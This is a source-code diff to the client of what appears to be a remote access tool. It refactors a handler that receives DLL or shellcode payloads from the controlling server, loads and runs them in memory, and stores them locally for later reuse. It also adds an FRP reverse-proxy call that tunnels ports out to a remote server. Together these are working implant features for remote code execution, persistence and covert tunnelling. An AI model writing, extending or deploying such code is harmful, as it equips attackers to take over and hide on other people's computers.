@@ -21,6 +21,8 @@
 
 #pragma comment(lib, "urlmon.lib")
 
+int CKernelManager::g_IsAppExit = FALSE;
+
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
 {
@@ -139,21 +141,25 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "Ser
     return TRUE;
 }
 
-typedef struct DllExecParam {
-    DllExecuteInfo info;
+template <typename T = DllExecuteInfo>
+class DllExecParam {
+public:
+    T *info;
     PluginParam param;
     BYTE* buffer;
     CManager* manager;
-    DllExecParam(const DllExecuteInfo& dll, const PluginParam& arg, BYTE* data, CManager* m) : info(dll), param(arg), manager(m)
+    DllExecParam(const T& dll, const PluginParam& arg, BYTE* data, CManager* m) : info(new T()), param(arg), manager(m)
     {
-        buffer = new BYTE[info.Size];
-        memcpy(buffer, data, info.Size);
+        buffer = new BYTE[dll.Size];
+        memcpy(buffer, data, dll.Size);
+        memcpy(info, &dll, sizeof(dll));
     }
     ~DllExecParam()
     {
         SAFE_DELETE_ARRAY(buffer);
+        SAFE_DELETE(info);
     }
-} DllExecParam;
+};
 
 
 class MemoryDllRunner : public DllRunner
@@ -177,14 +183,23 @@ public:
     }
 };
 
+typedef int (*RunSimpleTcpFunc)(
+	const char* privilegeKey,
+	long timestamp,
+	const char* serverAddr,
+	int serverPort,
+	int localPort,
+	int remotePort,
+	int* statusPtr
+	);
 
 DWORD WINAPI ExecuteDLLProc(LPVOID param)
 {
-    DllExecParam* dll = (DllExecParam*)param;
-    DllExecuteInfo info = dll->info;
+    DllExecParam<>* dll = (DllExecParam<>*)param;
+    DllExecuteInfo info = *(dll->info);
     PluginParam pThread = dll->param;
     CManager* This = dll->manager;
-#ifdef _DEBUG
+#if _DEBUG
     WriteBinaryToFile((char*)dll->buffer, info.Size, info.Name);
     DllRunner* runner = new DefaultDllRunner(info.Name);
 #else
@@ -208,9 +223,29 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             }
             break;
         }
+        case CALLTYPE_FRPC_CALL: {
+            RunSimpleTcpFunc proc = module ? (RunSimpleTcpFunc)runner->GetProcAddress(module, "RunSimpleTcp") : NULL;
+            char* user = (char*)dll->param.User;
+            FrpcParam* f = (FrpcParam*)user;
+            if (proc) {
+                Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
+                int r=proc(f->privilegeKey, f->timestamp, f->serverAddr, f->serverPort, f->localPort, f->remotePort, 
+                    &CKernelManager::g_IsAppExit);
+                if (r) {
+					char buf[100];
+					sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
+					Mprintf("%s\n", buf);
+					ClientMsg msg("代理端口", buf);
+					This->SendData((LPBYTE)&msg, sizeof(msg));
+                }
+            }
+            SAFE_DELETE_ARRAY(user);
+            break;
+        }
         default:
             break;
         }
+        if (info.CallType != CALLTYPE_FRPC_CALL)
         runner->FreeLibrary(module);
     } else if (info.RunType == SHELLCODE) {
         bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
@@ -532,6 +567,50 @@ std::string getHardwareIDByCfg(const std::string& pwdHash, const std::string& ma
     return "";
 }
 
+template<typename T = DllExecuteInfo>
+BOOL ExecDLL(CKernelManager *This, PBYTE szBuffer, ULONG ulLength, void *user) {
+	static std::map<std::string, std::vector<BYTE>> m_MemDLL;
+	const int sz = 1 + sizeof(T);
+	if (ulLength < sz) return FALSE;
+	const T* info = (T*)(szBuffer + 1);
+	const char* md5 = info->Md5;
+	auto find = m_MemDLL.find(md5);
+	if (find == m_MemDLL.end() && ulLength == sz) {
+		iniFile cfg(CLIENT_PATH);
+		auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
+		if (md5.empty() || md5 != info->Md5 || !This->m_conn->IsVerified()) {
+			// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
+            This->m_ClientObject->Send2Server((char*)szBuffer, ulLength);
+            return TRUE;
+		}
+		Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
+		binFile bin(CLIENT_PATH);
+		auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
+		const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
+		m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
+		find = m_MemDLL.find(md5);
+	}
+	BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
+	if (info->Size == ulLength - sz) {
+		if (md5[0]) {
+			m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
+			iniFile cfg(CLIENT_PATH);
+			cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
+			binFile bin(CLIENT_PATH);
+			std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
+			bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
+			Mprintf("Save DLL to registry: %s\n", md5);
+		}
+		data = szBuffer + sz;
+	}
+	if (data) {
+		PluginParam param(This->m_conn->ServerIP(), This->m_conn->ServerPort(), &This->g_bExit, user);
+		CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam<T>(*info, param, data, This), 0, NULL));
+		Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
+	}
+    return data != NULL;
+}
+
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
     bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
@@ -657,47 +736,25 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case CMD_EXECUTE_DLL: {
-        static std::map<std::string, std::vector<BYTE>> m_MemDLL;
-        const int sz = 1 + sizeof(DllExecuteInfo);
-        if (ulLength < sz)break;
-        DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
-        const char* md5 = info->Md5;
-        auto find = m_MemDLL.find(md5);
-        if (find == m_MemDLL.end() && ulLength == sz) {
-            iniFile cfg(CLIENT_PATH);
-            auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
-            if (md5.empty() || md5 != info->Md5 || !m_conn->IsVerified()) {
-                // 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
-                m_ClientObject->Send2Server((char*)szBuffer, ulLength);
-                break;
-            }
-            Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
-            binFile bin(CLIENT_PATH);
-            auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
-            const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
-            m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
-            find = m_MemDLL.find(md5);
-        }
-        BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
-        if (info->Size == ulLength - sz) {
-            if (md5[0]) {
-                m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
-                iniFile cfg(CLIENT_PATH);
-                cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
-                binFile bin(CLIENT_PATH);
-                std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
-                bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
-                Mprintf("Save DLL to registry: %s\n", md5);
-            }
-            data = szBuffer + sz;
-        }
-        if (data) {
-            PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
-            CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data, this), 0, NULL));
-            Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
+        if (!ExecDLL(this, szBuffer, ulLength, m_conn)) {
+            Mprintf("CKernelManager ExecDLL failed: %d bytes\n", ulLength);
         }
         break;
     }
+	case CMD_EXECUTE_DLL_NEW: {
+        if (sizeof(szBuffer) == 4) {
+            Mprintf("CKernelManager ExecDLL failed: NOT x64 client\n");
+            break;
+        }
+        DllExecuteInfoNew* info = ulLength > sizeof(DllExecuteInfoNew) ? (DllExecuteInfoNew*)(szBuffer + 1) : 0;
+        char* user = info ? new char[400] : 0;
+        if (user == NULL) break;;
+        if (info) memcpy(user, info->Parameters, 400);
+		if (!ExecDLL<DllExecuteInfoNew>(this, szBuffer, ulLength, user)) {
+			Mprintf("CKernelManager ExecDLL failed: received %d bytes\n", ulLength);
+		}
+		break;
+	}
 
     case TOKEN_PRIVATESCREEN: {
         char h[100] = {};
